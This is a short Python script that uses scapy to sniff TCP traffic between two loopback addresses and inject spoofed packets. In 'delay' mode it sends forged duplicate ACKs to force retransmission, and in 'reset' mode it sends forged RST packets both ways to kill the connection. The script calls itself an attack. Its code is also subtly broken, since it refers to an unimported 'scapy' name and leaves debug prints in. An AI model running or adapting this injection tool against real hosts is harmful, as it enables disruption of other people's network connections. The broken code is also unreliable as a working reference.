from scapy.all import *

# Define the IP addresses and port numbers for the client and server
src_ip = '127.0.0.2'
dst_ip = '127.0.0.1'
src_port = 12346
dst_port = 12345

# Define the packet delay time in seconds
delay_time = 0.1

# Define the packet filter to capture incoming TCP packets
filter = 'tcp and src host {} and dst host {} and src port {} and dst port {}'.format(src_ip, dst_ip, src_port, dst_port)

# Define the packet handling function for delayed packets
def delay_packet(packet):
    print("hello1")
    # Send 3 ACK packets to force retransmission
    for i in range(3):
        scapy.send(scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/scapy.TCP(dport=packet[scapy.TCP].sport, sport=packet[scapy.TCP].dport, flags="A", seq=packet[scapy.TCP].seq, ack=packet[scapy.TCP].seq+len(packet[scapy.TCP].payload)))

# Define the packet handling function for reset packets
def reset_packet(packet):
    print("hello2")
    # Send a TCP RST packet to drop the connection
    scapy.send(scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/scapy.TCP(dport=packet[scapy.TCP].sport, sport=packet[scapy.TCP].dport, seq=packet[scapy.TCP].ack, ack=packet[scapy.TCP].seq,flags='R'), verbose=False)
    scapy.send(scapy.IP(dst=packet[scapy.IP].dst, src=packet[scapy.IP].src)/scapy.TCP(dport=packet[scapy.TCP].dport, sport=packet[scapy.TCP].sport, seq=packet[scapy.TCP].seq, ack=packet[scapy.TCP].ack, flags='R'), verbose=False)    


if __name__=="__main__":
    # Wait for user input on the desired throttling mode
    while True:
        mode = input('Enter "delay" for delayed packets or "reset" for reset packets: ')

        # Handle delayed packets
        if mode == 'delay':
            print('Delaying packets...')
            sniff(filter=filter, count=100000, prn=delay_packet)
            print('Atack done')

        # Handle reset packets
        elif mode == 'reset':
            print('Resetting packets...')
            sniff(filter=filter, count=1000, prn=reset_packet)
            print('Atack done')


        # Handle invalid input
        else:
            print('Invalid input. Please enter "delay" or "reset".')
